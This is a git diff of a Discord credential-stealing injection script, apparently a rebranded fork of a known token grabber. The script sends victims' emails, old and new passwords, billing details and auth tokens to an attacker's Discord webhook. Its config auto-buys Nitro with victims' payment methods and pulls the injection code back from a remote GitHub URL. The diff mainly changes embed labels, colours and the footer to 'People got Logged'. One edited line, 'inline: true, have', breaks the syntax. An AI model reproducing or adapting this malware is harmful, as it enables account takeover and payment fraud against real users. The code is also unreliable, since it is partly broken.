@@ -8,11 +8,11 @@ const { BrowserWindow, session } = require("electron");
 const config = {
     webhook: "%WEBHOOK%", //your discord webhook there obviously
     auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-    ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
+    ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
     ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-    embed_name: "Discord Injection", //name of the webhook thats gonna send the info
+    embed_name: "Injection", //name of the webhook thats gonna send the info
     embed_icon: "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-    embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+    embed_color: 6684927, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     injection_url: "https://raw.githubusercontent.com/wtf-myra/Injection/main/injection.js", //injection url for when it reinjects
     /**
      * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
@@ -368,26 +368,26 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                 fields: [
                     {
                         name: "**Password Changed**",
-                        value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-                        inline: true,
+                        value: `EMail » **${json.email}**\n🔻 Password » **${oldpassword}**\n🔺 Password » **${newpassword}**`,
+                        inline: true, have
                     },
                     {
-                        name: "**Discord Info**",
-                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-                        inline: true,
+                        name: "💳",
+                        value: `Nitro » **${nitro}**\nBadges » **${badges}**\nBilling » **${billing}**`,
+                        inline: false,
                     },
                     {
-                        name: "**Token**",
-                        value: `\`${token}\``,
+                        name: "🔑",
+                        value: `Token » \`${token}\``,
                         inline: false,
                     },
                 ],
                 author: {
-                    name: json.username + "#" + json.discriminator + " | " + json.id,
+                    name: json.username + "#" + json.discriminator + " • " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+                    text: "🔒 • People got Logged",
                 },
             },
         ],
